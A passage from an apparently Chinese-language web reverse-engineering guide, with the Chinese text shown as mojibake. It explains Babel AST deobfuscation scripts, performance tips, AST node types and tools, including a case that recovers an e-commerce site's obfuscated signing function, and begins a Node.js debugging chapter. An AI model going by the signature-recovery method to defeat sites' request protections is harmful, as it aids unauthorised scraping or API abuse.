<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">test</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">).</span><span class="nx">evaluate</span><span class="p">();</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">test</span><span class="p">.</span><span class="nx">confident</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">test</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWithMultiple</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">consequent</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">alternate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWithMultiple</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">alternate</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">path</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// ========== æ­¥éª¤ 4: åˆ é™¤æœªä½¿ç”¨çš„å˜é‡ ==========</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">VariableDeclarator</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">binding</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">scope</span><span class="p">.</span><span class="nx">getBinding</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">binding</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">binding</span><span class="p">.</span><span class="nx">referenced</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[åˆ é™¤] æœªä½¿ç”¨çš„å˜é‡: </span><span class="si">${</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// ========== æ­¥éª¤ 5: å‡½æ•°è°ƒç”¨å†…è” (ç®€å•æƒ…å†µ) ==========</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">CallExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// å¦‚æœè°ƒç”¨çš„æ˜¯ IIFEï¼ˆç«‹å³æ‰§è¡Œå‡½æ•°ï¼‰</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isFunctionExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">callee</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// æ›¿æ¢ä¸ºå‡½æ•°ä½“</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">isReturnStatement</span><span class="p">(</span><span class="nx">body</span><span class="p">[</span><span class="mf">0</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">body</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">argument</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="c1">// ç”Ÿæˆä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generator</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">jsescOption</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">minimal</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">},</span>
<span class="w">    </span><span class="nx">compact</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">  </span><span class="c1">// ä¸å‹ç¼©</span>
<span class="w">    </span><span class="nx">comments</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w">  </span><span class="c1">// å»é™¤æ³¨é‡Š</span>
<span class="p">});</span>

<span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;deobfuscated.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;\nåæ··æ·†å®Œæˆï¼è¾“å‡ºæ–‡ä»¶: deobfuscated.js&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`æºä»£ç : </span><span class="si">${</span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="si">}</span><span class="sb"> å­—ç¬¦`</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`åæ··æ·†å: </span><span class="si">${</span><span class="nx">output</span><span class="p">.</span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="si">}</span><span class="sb"> å­—ç¬¦`</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="42-æ€§èƒ½ä¼˜åŒ–">4.2 æ€§èƒ½ä¼˜åŒ–</h3>

      <p><strong>é—®é¢˜</strong>: AST éå†å¾ˆæ…¢ï¼Œå°¤å…¶æ˜¯å¤§æ–‡ä»¶</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ 1: å•æ¬¡éå†</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// âŒ æ…¢ï¼ˆå¤šæ¬¡éå†ï¼‰</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">BinaryExpression</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="p">});</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">IfStatement</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="p">});</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">CallExpression</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="p">});</span>

<span class="c1">// âœ… å¿«ï¼ˆå•æ¬¡éå†ï¼‰</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">BinaryExpression</span><span class="p">()</span><span class="w"> </span><span class="p">{},</span>
<span class="w">    </span><span class="nx">IfStatement</span><span class="p">()</span><span class="w"> </span><span class="p">{},</span>
<span class="w">    </span><span class="nx">CallExpression</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ 2: æå‰é€€å‡º</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">FunctionDeclaration</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">&#39;targetFunction&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// æ‰¾åˆ°ç›®æ ‡å‡½æ•°ï¼Œåœæ­¢éå†</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">stop</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ 3: é™åˆ¶éå†æ·±åº¦</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">enter</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// åªéå†ç¬¬ä¸€å±‚</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">loc</span><span class="p">.</span><span class="nx">start</span><span class="p">.</span><span class="nx">line</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">skip</span><span class="p">();</span><span class="w">  </span><span class="c1">// è·³è¿‡å­èŠ‚ç‚¹</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="5-ast-explorer-åœ¨çº¿å·¥å…·">5. AST Explorer (åœ¨çº¿å·¥å…·)</h2>

      <p><strong>ç½‘å€</strong>: <a href="https://astexplorer.net/">https://astexplorer.net/</a></p>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>å®æ—¶æŸ¥çœ‹ä»£ç çš„ AST ç»“æ„</li>
        <li>æ”¯æŒå¤šç§è¯­è¨€ï¼ˆJavaScript, TypeScript, JSX, etc.ï¼‰</li>
        <li>æ”¯æŒå¤šç§è§£æå™¨ï¼ˆBabel, Acorn, Esprima, etc.ï¼‰</li>
        <li>å®æ—¶ç¼–å†™å’Œæµ‹è¯•è½¬æ¢æ’ä»¶</li>
      </ul>

      <p><strong>ä½¿ç”¨æ­¥éª¤</strong>:</p>

      <ol>
        <li>è®¿é—® astexplorer.net</li>
        <li>å·¦ä¾§è¾“å…¥ JavaScript ä»£ç </li>
        <li>å³ä¾§è‡ªåŠ¨æ˜¾ç¤º AST ç»“æ„</li>
        <li>ç‚¹å‡»èŠ‚ç‚¹æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</li>
        <li>åœ¨ Transform æ ‡ç­¾é¡µç¼–å†™ Babel æ’ä»¶æµ‹è¯•</li>
      </ol>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <p>è¾“å…¥:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
</code></pre>
      </div>

      <p>AST è¾“å‡ºï¼ˆç®€åŒ–ï¼‰:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;VariableDeclaration&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;declarations&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span>
<span class="w">    </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;VariableDeclarator&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Identifier&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;x&quot;</span><span class="w"> </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;init&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;BinaryExpression&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;operator&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;+&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;left&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;NumericLiteral&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">},</span>
<span class="w">      </span><span class="nt">&quot;right&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;NumericLiteral&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}]</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="6-å®æˆ˜æ¡ˆä¾‹">6. å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹-1æŸç”µå•†ç½‘ç«™çš„ç­¾åç®—æ³•">æ¡ˆä¾‹ 1ï¼šæŸç”µå•†ç½‘ç«™çš„ç­¾åç®—æ³•</h3>

      <p><strong>ç›®æ ‡</strong>: è¿˜åŸæ··æ·†çš„ç­¾åå‡½æ•°</p>

      <p><strong>æ··æ·†ä»£ç </strong> (ç®€åŒ–ç‰ˆ):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">_0x1234</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;sign&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;md5&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;timestamp&#39;</span><span class="p">];</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">_0xabcd</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>åæ··æ·†è„šæœ¬</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// (ä½¿ç”¨å‰é¢çš„å®Œæ•´è„šæœ¬)</span>
</code></pre>
      </div>

      <p><strong>åæ··æ·†å</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">_0xabcd</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s1">&#39;sign&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;timestamp&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>æ‰‹åŠ¨ç®€åŒ–</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">generateSignString</span><span class="p">(</span><span class="nx">user_id</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s1">&#39;sign&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">user_id</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;timestamp&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="æ¡ˆä¾‹-2æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ">æ¡ˆä¾‹ 2ï¼šæ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ</h3>

      <p><strong>æ··æ·†ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;init&#39;</span><span class="p">;</span>
<span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">_state</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">&#39;end&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">_state</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;init&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Start&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;middle&#39;</span><span class="p">;</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;middle&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Process&#39;</span><span class="p">);</span>
<span class="w">            </span><span class="nx">_state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;end&#39;</span><span class="p">;</span>
<span class="w">            </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>åæ··æ·†è„šæœ¬</strong>: (ä½¿ç”¨å‰é¢çš„æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸä»£ç )</p>

      <p><strong>åæ··æ·†å</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Start&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Process&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="7-å¸¸è§-ast-èŠ‚ç‚¹ç±»å‹">7. å¸¸è§ AST èŠ‚ç‚¹ç±»å‹</h2>

      <table>
        <thead>
          <tr>
            <th>ç±»å‹</th>
            <th>è¯´æ˜</th>
            <th>ç¤ºä¾‹ä»£ç </th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Program</strong></td>
            <td>æ•´ä¸ªç¨‹åº</td>
            <td><code>æ•´ä¸ª JS æ–‡ä»¶</code></td>
          </tr>
          <tr>
            <td><strong>FunctionDeclaration</strong></td>
            <td>å‡½æ•°å£°æ˜</td>
            <td><code>function foo() {}</code></td>
          </tr>
          <tr>
            <td><strong>VariableDeclaration</strong></td>
            <td>å˜é‡å£°æ˜</td>
            <td><code>const x = 1;</code></td>
          </tr>
          <tr>
            <td><strong>ExpressionStatement</strong></td>
            <td>è¡¨è¾¾å¼è¯­å¥</td>
            <td><code>console.log();</code></td>
          </tr>
          <tr>
            <td><strong>CallExpression</strong></td>
            <td>å‡½æ•°è°ƒç”¨</td>
            <td><code>foo()</code></td>
          </tr>
          <tr>
            <td><strong>BinaryExpression</strong></td>
            <td>äºŒå…ƒè¡¨è¾¾å¼</td>
            <td><code>1 + 2</code></td>
          </tr>
          <tr>
            <td><strong>Identifier</strong></td>
            <td>æ ‡è¯†ç¬¦</td>
            <td><code>foo</code>, <code>x</code></td>
          </tr>
          <tr>
            <td><strong>NumericLiteral</strong></td>
            <td>æ•°å­—å­—é¢é‡</td>
            <td><code>123</code></td>
          </tr>
          <tr>
            <td><strong>StringLiteral</strong></td>
            <td>å­—ç¬¦ä¸²å­—é¢é‡</td>
            <td><code>'hello'</code></td>
          </tr>
          <tr>
            <td><strong>ArrayExpression</strong></td>
            <td>æ•°ç»„è¡¨è¾¾å¼</td>
            <td><code>[1, 2, 3]</code></td>
          </tr>
          <tr>
            <td><strong>ObjectExpression</strong></td>
            <td>å¯¹è±¡è¡¨è¾¾å¼</td>
            <td><code>{a: 1, b: 2}</code></td>
          </tr>
          <tr>
            <td><strong>MemberExpression</strong></td>
            <td>æˆå‘˜è®¿é—®</td>
            <td><code>obj.prop</code>, <code>arr[0]</code></td>
          </tr>
          <tr>
            <td><strong>IfStatement</strong></td>
            <td>if è¯­å¥</td>
            <td><code>if (x) {...}</code></td>
          </tr>
          <tr>
            <td><strong>WhileStatement</strong></td>
            <td>while å¾ªç¯</td>
            <td><code>while (true) {...}</code></td>
          </tr>
          <tr>
            <td><strong>ForStatement</strong></td>
            <td>for å¾ªç¯</td>
            <td><code>for (;;) {...}</code></td>
          </tr>
          <tr>
            <td><strong>ReturnStatement</strong></td>
            <td>return è¯­å¥</td>
            <td><code>return x;</code></td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="8-å·¥å…·ä¸èµ„æº">8. å·¥å…·ä¸èµ„æº</h2>

      <table>
        <thead>
          <tr>
            <th>èµ„æº</th>
            <th>ç±»å‹</th>
            <th>é“¾æ¥</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>AST Explorer</strong></td>
            <td>åœ¨çº¿å·¥å…·</td>
            <td>https://astexplorer.net/</td>
          </tr>
          <tr>
            <td><strong>Babel æ–‡æ¡£</strong></td>
            <td>å®˜æ–¹æ–‡æ¡£</td>
            <td>https://babeljs.io/docs/</td>
          </tr>
          <tr>
            <td><strong>Babel Handbook</strong></td>
            <td>æ·±åº¦æ•™ç¨‹</td>
            <td>https://github.com/jamiebuilds/babel-handbook</td>
          </tr>
          <tr>
            <td><strong>jsjiami è¿˜åŸ</strong></td>
            <td>å¼€æºå·¥å…·</td>
            <td>GitHub: javascript-obfuscator-deobfuscator</td>
          </tr>
          <tr>
            <td><strong>webcrack</strong></td>
            <td>Webpack åæ‰“åŒ…</td>
            <td>https://github.com/j4k0xb/webcrack</td>
          </tr>
          <tr>
            <td><strong>de4js</strong></td>
            <td>åœ¨çº¿åæ··æ·†</td>
            <td>https://lelinhtinh.github.io/de4js/</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>AST æ˜¯å¯¹æŠ—é«˜é˜¶æ··æ·†çš„ç»ˆææ‰‹æ®µã€‚æŒæ¡ä»¥ä¸‹æŠ€èƒ½ï¼š</p>

      <ol>
        <li>âœ… <strong>Babel å·¥ä½œæµ</strong>: parse â†’ traverse â†’ generate</li>
        <li>âœ… <strong>å¸¸ç”¨è½¬æ¢</strong>: å¸¸é‡æŠ˜å ã€æ­»ä»£ç æ¶ˆé™¤ã€å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ</li>
        <li>âœ… <strong>Visitor æ¨¡å¼</strong>: ç†è§£å¦‚ä½•éå†å’Œä¿®æ”¹ AST</li>
        <li>âœ… <strong>Path å’Œ Scope</strong>: æŒæ¡è·¯å¾„æ“ä½œå’Œä½œç”¨åŸŸåˆ†æ</li>
        <li>âœ… <strong>ç±»å‹ç³»ç»Ÿ</strong>: ä½¿ç”¨ @babel/types åˆ›å»ºå’Œæ£€æŸ¥èŠ‚ç‚¹</li>
        <li>âœ… <strong>æ€§èƒ½ä¼˜åŒ–</strong>: å•æ¬¡éå†ã€æå‰é€€å‡ºã€é™åˆ¶æ·±åº¦</li>
      </ol>

      <p><strong>è®°ä½</strong>: AST è™½ç„¶å­¦ä¹ æ›²çº¿é™¡å³­ï¼Œä½†ä¸€æ—¦æŒæ¡ï¼Œä½ å°±èƒ½åƒå¤–ç§‘æ‰‹æœ¯ä¸€æ ·ç²¾ç¡®åœ°å‰”é™¤ä»£ç ä¸­çš„"æ¯’ç˜¤"ã€‚</p>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#03-Basic-Recipes-dynamic-parameter-analysis">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
        <li><a href="#02-Tooling-nodejs-debugging">Node.js è°ƒè¯•æŒ‡å—</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
      </ul>

    </div>

    <div class="section" id="02-Tooling-nodejs-debugging">
      <h2>23. Node.js Debugging</h2>
      <h1 id="nodejs-è°ƒè¯•æŒ‡å—">Node.js è°ƒè¯•æŒ‡å—</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>éšç€ Webpackã€Vite ç­‰æ„å»ºå·¥å…·çš„æ™®åŠï¼Œå‰ç«¯ä»£ç çš„æ··æ·†å’Œæ‰“åŒ…é€»è¾‘å¾€å¾€è¿è¡Œåœ¨ Node.js ç¯å¢ƒä¸­ã€‚é€†å‘å·¥ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦è°ƒè¯• Webpack çš„ Loader/Pluginã€åˆ†ææœåŠ¡ç«¯çš„ JS
        é€»è¾‘ã€æˆ–è€…ç†è§£åŠ å¯†ç®—æ³•çš„å®ç°ã€‚</p>

      <p>Node.js è°ƒè¯•çš„æ ¸å¿ƒæ˜¯åˆ©ç”¨ Chrome DevTools Protocol (CDP) æä¾›çš„å¼ºå¤§è°ƒè¯•èƒ½åŠ›ã€‚</p>

      <hr />

      <h2 id="1-åŸºç¡€è°ƒè¯•-inspect-brk">1. åŸºç¡€è°ƒè¯• (&#8211;inspect-brk)</h2>

      <h3 id="11-å¯åŠ¨è°ƒè¯•æ¨¡å¼">1.1 å¯åŠ¨è°ƒè¯•æ¨¡å¼</h3>

